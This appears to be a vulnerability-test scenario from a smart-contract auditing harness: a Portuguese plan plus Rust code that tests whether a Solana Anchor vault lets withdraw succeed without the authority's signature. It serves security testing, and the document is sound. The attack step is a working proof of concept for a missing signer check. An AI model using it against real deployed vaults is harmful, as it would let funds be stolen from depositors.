{
  "plan": "O cenário inicializa um vault PDA com autoridade legítima e deposita fundos, usando as instruções initialize e deposit como baseline. Em seguida, tenta executar withdraw sem a assinatura da autoridade, passando a conta authority como não-signer, para verificar se o programa aceita a operação sem a assinatura exigida. O efeito medido é a redução do saldo do vault e o aumento dos lamports do recipient, demonstrando que a operação restrita foi executada sem a assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let (vault_pda, bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Contas iniciais
let authority_account = wallet(10_000_000_000);
let recipient_account = wallet(1_000_000_000);
let vault_account = empty_account();
let system_program = system_program_account();

// Baseline: initialize
let init_ix = env.anchor_ix("initialize", &(), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let init_accounts = vec![
    (vault_pda, vault_account.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let init_result = env.baseline("initialize vault", &init_ix, &init_accounts);

// Baseline: deposit
let deposit_amount = 5_000_000_000u64;
let deposit_ix = env.anchor_ix("deposit", &deposit_amount, &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let deposit_accounts = vec![
    (vault_pda, after(&init_result, &vault_pda).clone()),
    (authority, after(&init_result, &authority).clone()),
    system_program.clone(),
];
let deposit_result = env.baseline("deposit funds", &deposit_ix, &deposit_accounts);

// Ataque: withdraw sem assinatura da autoridade
let withdraw_amount = 1_000_000_000u64;
let attack_ix = env.anchor_ix("withdraw", &withdraw_amount, &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, false), // não assina
    AccountMeta::new(recipient, false),
]);
let attack_accounts = vec![
    (vault_pda, after(&deposit_result, &vault_pda).clone()),
    (authority, after(&deposit_result, &authority).clone()),
    (recipient, recipient_account.clone()),
];
let attack_result = env.attack("withdraw without authority signature", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let vault_after = after(&attack_result, &vault_pda);
    let recipient_after = after(&attack_result, &recipient);
    let vault_balance_after = read_u64(vault_after.data(), 40); // authority (32) + balance (8) offset 40
    let recipient_lamports_after = recipient_after.lamports();
    env.effect("vault balance decreased without authority signature", vault_balance_after == deposit_amount - withdraw_amount);
    env.effect("recipient received lamports without authority signature", recipient_lamports_after == recipient_account.lamports() + withdraw_amount);
}"
}

